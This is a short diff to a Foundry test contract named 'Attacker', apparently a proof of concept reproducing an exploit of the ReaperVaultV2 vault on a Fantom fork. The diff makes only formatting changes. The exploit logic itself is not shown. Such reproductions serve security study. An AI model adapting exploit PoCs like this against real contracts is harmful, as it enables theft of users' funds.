@@ -29,7 +29,7 @@ contract Attacker is Test {
 
     function setUp() public {
         console.log("This is a simple PoC that shows how attacker abuse the ReaperVaultV2 contract");
-        cheat.createSelectFork("fantom", 44045899);
+        cheat.createSelectFork("fantom", 44_045_899);
         cheat.label(address(ReaperVault), "ReaperVault");
         cheat.label(address(USDC), "USDC");
     }
@@ -45,7 +45,6 @@ contract Attacker is Test {
 
         emit log_named_decimal_uint("Victim ReaperUSDCVault balance", ReaperVault.balanceOf(victim), 6);
         emit log_named_decimal_uint("Attacker USDC balance", USDC.balanceOf(address(this)), 6);
-
     }
 }
 
